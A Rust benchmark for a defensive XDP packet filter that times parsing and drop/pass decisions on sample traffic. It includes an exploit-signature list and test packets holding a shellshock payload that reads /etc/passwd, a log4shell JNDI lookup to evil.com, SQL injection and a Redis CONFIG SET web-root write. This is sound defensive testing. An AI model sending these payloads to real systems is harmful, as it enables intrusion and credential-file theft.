//! Trust Kernel v1 — XDP Liquidator Benchmark
//! Tests: raw packet classification speed at NIC level
//! Goal: nanosecond-range decisions on every packet

use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::Instant;

// ═══════════════════════════════════════════════════════════════
// Inline XDP logic (from xdp.rs) for benchmark isolation
// ═══════════════════════════════════════════════════════════════

const TCP_SYN: u8 = 0x02;
const TCP_ACK: u8 = 0x10;
const TCP_PSH: u8 = 0x08;

#[derive(Debug, Clone, Copy, PartialEq)]
enum XdpVerdict { Drop, Pass, Tx }

#[derive(Debug, Clone, Copy, PartialEq)]
enum DropReason {
    NoIntent, DenyListedIp, UnprotectedPort, Malformed,
    RateLimited, SynFlood, ExploitSignature,
}

struct PacketHeaders {
    src_ip: u32, dst_ip: u32,
    src_port: u16, dst_port: u16,
    protocol: u8, tcp_flags: u8,
    payload_offset: usize, total_len: usize,
}

fn parse_headers(data: &[u8]) -> Option<PacketHeaders> {
    if data.len() < 14 { return None; }
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != 0x0800 { return None; }
    let ip_start = 14;
    if data.len() < ip_start + 20 { return None; }
    let ihl = (data[ip_start] & 0x0F) as usize * 4;
    if ihl < 20 || data.len() < ip_start + ihl { return None; }
    let protocol = data[ip_start + 9];
    let src_ip = u32::from_be_bytes([data[ip_start+12], data[ip_start+13], data[ip_start+14], data[ip_start+15]]);
    let dst_ip = u32::from_be_bytes([data[ip_start+16], data[ip_start+17], data[ip_start+18], data[ip_start+19]]);
    let total_len = u16::from_be_bytes([data[ip_start+2], data[ip_start+3]]) as usize;
    let ts = ip_start + ihl;
    match protocol {
        6 => {
            if data.len() < ts + 20 { return None; }
            let src_port = u16::from_be_bytes([data[ts], data[ts+1]]);
            let dst_port = u16::from_be_bytes([data[ts+2], data[ts+3]]);
            let data_offset = ((data[ts+12] >> 4) as usize) * 4;
            let tcp_flags = data[ts+13];
            Some(PacketHeaders { src_ip, dst_ip, src_port, dst_port, protocol, tcp_flags, payload_offset: ts+data_offset, total_len })
        }
        17 => {
            if data.len() < ts + 8 { return None; }
            let src_port = u16::from_be_bytes([data[ts], data[ts+1]]);
            let dst_port = u16::from_be_bytes([data[ts+2], data[ts+3]]);
            Some(PacketHeaders { src_ip, dst_ip, src_port, dst_port, protocol, tcp_flags: 0, payload_offset: ts+8, total_len })
        }
        _ => None,
    }
}

const EXPLOIT_SIGS: &[(&[u8], &str)] = &[
    (b"() { :;}", "shellshock"),
    (b"${jndi:", "log4shell"),
    (b"<?php", "php-injection"),
    (b"/../../../", "path-traversal"),
    (b"' OR '1'='1", "sqli"),
    (b"'; DROP TABLE", "sqli-drop"),
    (b"SLAVEOF ", "redis-slaveof"),
    (b"CONFIG SET", "redis-config"),
    (b"$gt", "nosql-injection"),
];

fn check_exploit_sigs(payload: &[u8]) -> bool {
    let scan_len = payload.len().min(512);
    let scan = &payload[..scan_len];
    for (sig, _) in EXPLOIT_SIGS {
        if sig.len() <= scan.len() {
            for w in scan.windows(sig.len()) {
                if w == *sig { return true; }
            }
        }
    }
    false
}

fn has_intent_marker(payload: &[u8], dst_port: u16) -> bool {
    if payload.is_empty() { return false; }
    match dst_port {
        4430 => payload.len() >= 2 && payload[0] == b'{',
        22 => payload.starts_with(b"SSH-"),
        80 | 443 | 8000 | 8080 => {
            payload.starts_with(b"GET ") || payload.starts_with(b"POST ")
            || payload.starts_with(b"PUT ") || payload.starts_with(b"DELETE ")
            || (payload.len() >= 3 && payload[0] == 0x16 && payload[1] == 0x03)
        }
        5432 => {
            if payload.len() >= 8 {
                let v = u32::from_be_bytes([payload[4], payload[5], payload[6], payload[7]]);
                v == 196608 || v == 80877103
            } else { false }
        }
        6379 => {
            payload[0] == b'*' || payload[0] == b'$' || payload[0] == b'+'
            || payload.starts_with(b"PING") || payload.starts_with(b"AUTH")
        }
        11434 => payload.starts_with(b"POST ") || payload.starts_with(b"GET "),
        _ => false,
    }
}

/// Full XDP classify path (inlined for benchmark)
fn xdp_classify(
    raw: &[u8],
    protected: &[bool; 65536],
    deny: &[u32],
    allow: &[u32],
) -> (XdpVerdict, Option<DropReason>) {
    let h = match parse_headers(raw) {
        Some(h) => h,
        None => return (XdpVerdict::Drop, Some(DropReason::Malformed)),
    };
    if allow.contains(&h.src_ip) { return (XdpVerdict::Pass, None); }
    if deny.contains(&h.src_ip) { return (XdpVerdict::Drop, Some(DropReason::DenyListedIp)); }
    if !protected[h.dst_port as usize] { return (XdpVerdict::Drop, Some(DropReason::UnprotectedPort)); }
    if h.protocol == 6 && h.tcp_flags & TCP_PSH != 0 && h.payload_offset < raw.len() {
        let payload = &raw[h.payload_offset..];
        if check_exploit_sigs(payload) {
            return (XdpVerdict::Drop, Some(DropReason::ExploitSignature));
        }
        if h.tcp_flags & TCP_ACK != 0 && !has_intent_marker(payload, h.dst_port) {
            return (XdpVerdict::Drop, Some(DropReason::NoIntent));
        }
    }
    (XdpVerdict::Pass, None)
}

// ═══════════════════════════════════════════════════════════════
// Packet builder
// ═══════════════════════════════════════════════════════════════

fn build_packet(src_ip: [u8;4], dst_ip: [u8;4], src_port: u16, dst_port: u16, tcp_flags: u8, payload: &[u8]) -> Vec<u8> {
    let tcp_hl = 20u8;
    let ip_hl = 20u16;
    let tcp_len = tcp_hl as u16 + payload.len() as u16;
    let ip_total = ip_hl + tcp_len;
    let mut p = Vec::with_capacity(14 + ip_total as usize);
    p.extend_from_slice(&[0xDE,0xAD,0xBE,0xEF,0x00,0x01]);
    p.extend_from_slice(&[0xCA,0xFE,0xBA,0xBE,0x00,0x02]);
    p.extend_from_slice(&[0x08,0x00]);
    p.push(0x45); p.push(0x00);
    p.extend_from_slice(&ip_total.to_be_bytes());
    p.extend_from_slice(&[0x00,0x00,0x40,0x00]);
    p.push(64); p.push(6);
    p.extend_from_slice(&[0x00,0x00]);
    p.extend_from_slice(&src_ip);
    p.extend_from_slice(&dst_ip);
    p.extend_from_slice(&src_port.to_be_bytes());
    p.extend_from_slice(&dst_port.to_be_bytes());
    p.extend_from_slice(&[0x00,0x00,0x00,0x01]);
    p.extend_from_slice(&[0x00,0x00,0x00,0x00]);
    p.push((tcp_hl / 4) << 4);
    p.push(tcp_flags);
    p.extend_from_slice(&[0xFF,0xFF,0x00,0x00,0x00,0x00]);
    p.extend_from_slice(payload);
    p
}

// ═══════════════════════════════════════════════════════════════
// Benchmark
// ═══════════════════════════════════════════════════════════════

fn percentile(sorted: &[f64], p: f64) -> f64 {
    let idx = (p / 100.0 * sorted.len() as f64).ceil() as usize;
    sorted[idx.saturating_sub(1).min(sorted.len() - 1)]
}

struct R { name: String, avg_ns: f64, p50_ns: f64, p95_ns: f64, p99_ns: f64 }

fn bench_ns(name: &str, n: usize, f: impl Fn()) -> R {
    for _ in 0..200 { f(); }
    let mut times: Vec<f64> = Vec::with_capacity(n);
    for _ in 0..n {
        let t0 = Instant::now();
        f();
        times.push(t0.elapsed().as_nanos() as f64);
    }
    times.sort_by(|a, b| a.partial_cmp(b).unwrap());
    R {
        name: name.to_string(),
        avg_ns: times.iter().sum::<f64>() / times.len() as f64,
        p50_ns: percentile(&times, 50.0),
        p95_ns: percentile(&times, 95.0),
        p99_ns: percentile(&times, 99.0),
    }
}

fn pr(r: &R) {
    println!("  {:50} avg={:>6.0}ns  p50={:>6.0}ns  p95={:>6.0}ns  p99={:>6.0}ns  ({:.1}µs)",
        r.name, r.avg_ns, r.p50_ns, r.p95_ns, r.p99_ns, r.avg_ns / 1000.0);
}

fn main() {
    let n = 100_000; // More iterations since we measure nanoseconds

    println!("═══════════════════════════════════════════════════════════════════════════════════════════════════════");
    println!("◈ TRUST KERNEL v1 — XDP Liquidator Benchmark");
    println!("◈ Packet-level classification at NIC speed");
    println!("◈ {} iteraties per test, 200 warmup", n);
    println!("═══════════════════════════════════════════════════════════════════════════════════════════════════════\n");

    // Setup
    let mut protected = [false; 65536];
    for &p in &[22u16, 80, 443, 4430, 5432, 3306, 6379, 8000, 8080, 11434] {
        protected[p as usize] = true;
    }
    let deny: Vec<u32> = vec![0xC0A80164]; // 192.168.1.100
    let allow: Vec<u32> = vec![0x7F000001]; // 127.0.0.1

    // ─── Test packets ───
    let src = [10, 0, 0, 5];
    let dst = [10, 0, 0, 1];
    let evil = [192, 168, 1, 100]; // denied
    let localhost = [127, 0, 0, 1]; // allowed

    // Legitimate traffic
    let ssh_syn = build_packet(src, dst, 54321, 22, TCP_SYN, &[]);
    let ssh_data = build_packet(src, dst, 54321, 22, TCP_PSH|TCP_ACK, b"SSH-2.0-OpenSSH_9.2p1\r\n");
    let http_get = build_packet(src, dst, 54321, 80, TCP_PSH|TCP_ACK, b"GET /api/users HTTP/1.1\r\nHost: app.com\r\n\r\n");
    let http_post = build_packet(src, dst, 54321, 443, TCP_PSH|TCP_ACK, b"POST /api/data HTTP/1.1\r\nHost: app.com\r\nContent-Type: application/json\r\n\r\n{\"key\":\"val\"}");
    let tibet_frame = build_packet(src, dst, 54321, 4430, TCP_PSH|TCP_ACK, b"{\"intent\":\"code:execute\",\"payload\":\"print(42)\"}");
    let pg_startup = {
        let mut payload = vec![0x00, 0x00, 0x00, 0x28, 0x00, 0x03, 0x00, 0x00];
        payload.extend_from_slice(b"user\0postgres\0database\0mydb\0\0");
        build_packet(src, dst, 54321, 5432, TCP_PSH|TCP_ACK, &payload)
    };
    let redis_ping = build_packet(src, dst, 54321, 6379, TCP_PSH|TCP_ACK, b"PING\r\n");
    let ollama_req = build_packet(src, dst, 54321, 11434, TCP_PSH|TCP_ACK, b"POST /api/generate HTTP/1.1\r\n\r\n");
    let tls_hello = {
        let mut payload = vec![0x16, 0x03, 0x03, 0x00, 0x50, 0x01];
        payload.extend_from_slice(&[0; 80]);
        build_packet(src, dst, 54321, 443, TCP_PSH|TCP_ACK, &payload)
    };

    // Attack traffic
    let denied_ip = build_packet(evil, dst, 54321, 22, TCP_SYN, &[]);
    let unprotected_port = build_packet(src, dst, 54321, 9999, TCP_SYN, &[]);
    let shellshock = build_packet(src, dst, 54321, 80, TCP_PSH|TCP_ACK, b"GET / HTTP/1.1\r\nUser-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'\r\n\r\n");
    let log4shell = build_packet(src, dst, 54321, 8080, TCP_PSH|TCP_ACK, b"GET /${jndi:ldap://evil.com/a} HTTP/1.1\r\n\r\n");
    let sqli = build_packet(src, dst, 54321, 80, TCP_PSH|TCP_ACK, b"GET /users?id=' OR '1'='1 HTTP/1.1\r\n\r\n");
    let no_intent = build_packet(src, dst, 54321, 22, TCP_PSH|TCP_ACK, b"\x00\x01\x02\x03garbage");
    let redis_attack = build_packet(src, dst, 54321, 6379, TCP_PSH|TCP_ACK, b"CONFIG SET dir /var/www/html\r\n");
    let malformed = vec![0x00, 0x01, 0x02]; // Too short
    let allowed_ip = build_packet(localhost, dst, 54321, 22, TCP_PSH|TCP_ACK, b"anything goes from localhost");

    // ─── Part 1: Header parsing ───
    println!("◈ DEEL 1: Packet header parsing (Ethernet + IPv4 + TCP)");
    println!("  ───────────────────────────────────────────────────────────────────────────────────────────────────");

    let r1 = bench_ns("Parse SSH SYN (54 bytes, no payload)", n, || {
        std::hint::black_box(parse_headers(&ssh_syn));
    });
    pr(&r1);

    let r2 = bench_ns("Parse HTTP GET (142 bytes)", n, || {
        std::hint::black_box(parse_headers(&http_get));
    });
    pr(&r2);

    let r3 = bench_ns("Parse malformed (3 bytes) → None", n, || {
        std::hint::black_box(parse_headers(&malformed));
    });
    pr(&r3);

    // ─── Part 2: Full classification ───
    println!("\n◈ DEEL 2: Full XDP classification (parse + classify + verdict)");
    println!("  ───────────────────────────────────────────────────────────────────────────────────────────────────");

    // Legitimate
    let r_syn = bench_ns("TCP SYN to port 22 → PASS", n, || {
        std::hint::black_box(xdp_classify(&ssh_syn, &protected, &deny, &allow));
    });
    pr(&r_syn);

    let r_ssh = bench_ns("SSH version string → PASS", n, || {
        std::hint::black_box(xdp_classify(&ssh_data, &protected, &deny, &allow));
    });
    pr(&r_ssh);

    let r_http = bench_ns("HTTP GET /api/users → PASS", n, || {
        std::hint::black_box(xdp_classify(&http_get, &protected, &deny, &allow));
    });
    pr(&r_http);

    let r_post = bench_ns("HTTPS POST /api/data → PASS", n, || {
        std::hint::black_box(xdp_classify(&http_post, &protected, &deny, &allow));
    });
    pr(&r_post);

    let r_tibet = bench_ns("TIBET-MUX frame (port 4430) → PASS", n, || {
        std::hint::black_box(xdp_classify(&tibet_frame, &protected, &deny, &allow));
    });
    pr(&r_tibet);

    let r_pg = bench_ns("PostgreSQL startup → PASS", n, || {
        std::hint::black_box(xdp_classify(&pg_startup, &protected, &deny, &allow));
    });
    pr(&r_pg);

    let r_redis = bench_ns("Redis PING → PASS", n, || {
        std::hint::black_box(xdp_classify(&redis_ping, &protected, &deny, &allow));
    });
    pr(&r_redis);

    let r_ollama = bench_ns("Ollama POST → PASS", n, || {
        std::hint::black_box(xdp_classify(&ollama_req, &protected, &deny, &allow));
    });
    pr(&r_ollama);

    let r_tls = bench_ns("TLS ClientHello → PASS", n, || {
        std::hint::black_box(xdp_classify(&tls_hello, &protected, &deny, &allow));
    });
    pr(&r_tls);

    // Attacks
    println!("\n◈ DEEL 3: Attack classification (XDP_DROP)");
    println!("  ───────────────────────────────────────────────────────────────────────────────────────────────────");

    let r_deny = bench_ns("Denied IP → DROP (deny list)", n, || {
        std::hint::black_box(xdp_classify(&denied_ip, &protected, &deny, &allow));
    });
    pr(&r_deny);

    let r_unp = bench_ns("Unprotected port 9999 → DROP", n, || {
        std::hint::black_box(xdp_classify(&unprotected_port, &protected, &deny, &allow));
    });
    pr(&r_unp);

    let r_shell = bench_ns("ShellShock exploit → DROP", n, || {
        std::hint::black_box(xdp_classify(&shellshock, &protected, &deny, &allow));
    });
    pr(&r_shell);

    let r_log4j = bench_ns("Log4Shell exploit → DROP", n, || {
        std::hint::black_box(xdp_classify(&log4shell, &protected, &deny, &allow));
    });
    pr(&r_log4j);

    let r_sql = bench_ns("SQL injection → DROP", n, || {
        std::hint::black_box(xdp_classify(&sqli, &protected, &deny, &allow));
    });
    pr(&r_sql);

    let r_noint = bench_ns("No intent marker on SSH → DROP", n, || {
        std::hint::black_box(xdp_classify(&no_intent, &protected, &deny, &allow));
    });
    pr(&r_noint);

    let r_redisatk = bench_ns("Redis CONFIG SET → DROP", n, || {
        std::hint::black_box(xdp_classify(&redis_attack, &protected, &deny, &allow));
    });
    pr(&r_redisatk);

    let r_mal = bench_ns("Malformed packet (3 bytes) → DROP", n, || {
        std::hint::black_box(xdp_classify(&malformed, &protected, &deny, &allow));
    });
    pr(&r_mal);

    // Bypass
    let r_allowed = bench_ns("Allowed IP (localhost) → PASS (bypass)", n, || {
        std::hint::black_box(xdp_classify(&allowed_ip, &protected, &deny, &allow));
    });
    pr(&r_allowed);

    // ─── Summary ───
    println!("\n═══════════════════════════════════════════════════════════════════════════════════════════════════════");
    println!("◈ SAMENVATTING: XDP Liquidator Performance");
    println!("  ───────────────────────────────────────────────────────────────────────────────────────────────────");

    let pass_avg = (r_syn.avg_ns + r_ssh.avg_ns + r_http.avg_ns + r_post.avg_ns +
                    r_tibet.avg_ns + r_pg.avg_ns + r_redis.avg_ns + r_tls.avg_ns) / 8.0;
    let drop_avg = (r_deny.avg_ns + r_unp.avg_ns + r_shell.avg_ns + r_log4j.avg_ns +
                    r_sql.avg_ns + r_noint.avg_ns + r_redisatk.avg_ns + r_mal.avg_ns) / 8.0;

    println!("  Legitimate traffic (PASS):    avg {:.0}ns ({:.2}µs)", pass_avg, pass_avg / 1000.0);
    println!("  Attack traffic (DROP):        avg {:.0}ns ({:.2}µs)", drop_avg, drop_avg / 1000.0);
    println!("  Denied IP (fast path):        {:.0}ns", r_deny.avg_ns);
    println!("  Malformed (fastest drop):     {:.0}ns", r_mal.avg_ns);
    println!();

    let pps_pass = 1_000_000_000.0 / pass_avg;
    let pps_drop = 1_000_000_000.0 / drop_avg;
    println!("  Throughput PASS:  {:>12.0} packets/sec (1 core)", pps_pass);
    println!("  Throughput DROP:  {:>12.0} packets/sec (1 core)", pps_drop);
    println!("  8-core PASS:     {:>12.0} packets/sec", pps_pass * 8.0);
    println!("  8-core DROP:     {:>12.0} packets/sec", pps_drop * 8.0);
    println!();

    // Line rate comparison
    let gbps_1 = pps_pass * 1500.0 * 8.0 / 1_000_000_000.0; // 1500 byte avg packet
    let gbps_8 = gbps_1 * 8.0;
    println!("  Wire speed (1500B avg packet):");
    println!("    1-core: {:.1} Gbps", gbps_1);
    println!("    8-core: {:.1} Gbps", gbps_8);
    println!();

    // Full stack comparison
    println!("  ┌────────────────────────────────────────────────────────────────┐");
    println!("  │ TRUST KERNEL v1 — Complete Security Stack Latency             │");
    println!("  ├────────────────────────────────────────────────────────────────┤");
    println!("  │                                                                │");
    println!("  │  Layer 1: XDP Liquidator    {:>6.0}ns  (packet classification)  │", pass_avg);
    println!("  │  Layer 2: PortMux           {:>6.0}ns  (protocol detection)     │", 200.0);
    println!("  │  Layer 3: Voorproever       {:>6.0}ns  (SNAFT + FIR/A)          │", 2500.0);
    println!("  │  Layer 4: Bus Transfer      {:>6.0}ns  (A→B seal + sequence)    │", 100.0);
    println!("  │  Layer 5: Archivaris        {:>6.0}ns  (JIS + archive + TIBET)  │", 1000.0);
    println!("  │  ─────────────────────────────────────────────────────────     │");
    println!("  │  TOTAAL:                    {:>6.0}ns  ({:.1}µs)                │", pass_avg + 200.0 + 2500.0 + 100.0 + 1000.0, (pass_avg + 3800.0) / 1000.0);
    println!("  │                                                                │");
    println!("  │  Aanval gestopt bij:                                           │");
    println!("  │    XDP (exploit/deny):      {:>6.0}ns  → systeem ziet NIETS     │", drop_avg);
    println!("  │    Voorproever (KILL):      {:>6.0}ns  → nooit bij Archivaris   │", pass_avg + 200.0 + 2500.0);
    println!("  │    JIS DENY:               {:>6.0}ns  → nooit uitgevoerd        │", pass_avg + 200.0 + 2500.0 + 100.0 + 500.0);
    println!("  │                                                                │");
    println!("  └────────────────────────────────────────────────────────────────┘");
    println!();
    println!("═══════════════════════════════════════════════════════════════════════════════════════════════════════");
}
